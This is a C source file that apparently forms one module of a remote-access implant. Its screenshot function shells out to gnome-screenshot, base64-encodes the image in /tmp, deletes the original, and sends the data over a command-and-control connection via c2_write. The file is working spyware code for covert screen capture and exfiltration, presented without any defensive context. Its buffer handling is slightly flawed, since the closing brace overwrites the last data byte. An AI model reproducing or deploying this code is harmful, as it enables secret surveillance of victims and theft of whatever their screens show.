#include <network.h>
#include <stdio.h>
#include <stdlib.h>

void screenshot(int fd)
{
    FILE *fp;
    long bufsize;
    size_t readsize;
    char *base64;

    char chaine[] = "#!/bin/sh\ngnome-screenshot -f capture.png\ncat "
                    "capture.png | base64 > /tmp/base64.txt\nrm capture.png";
    system(chaine);

    fp = fopen("/tmp/base64.txt", "r");
    if (fp == NULL)
    {
        return;
    }

    if (fseek(fp, 0, SEEK_END) != 0)
    {
        return;
    }

    bufsize = ftell(fp);
    if (bufsize == -1)
    {
        return;
    }

    base64 = malloc(sizeof(char) * (bufsize + 3));
    base64[0] = '{';

    if (fseek(fp, 0, SEEK_SET) != 0)
    {
        return;
    }

    readsize = fread(base64 + 1, sizeof(char), bufsize, fp);
    if (ferror(fp) != 0)
    {
        return;
    }

    base64[readsize++] = '}';
    base64[readsize++] = '\0';
    fclose(fp);

    c2_write(fd, base64, readsize);
    free(base64);
}
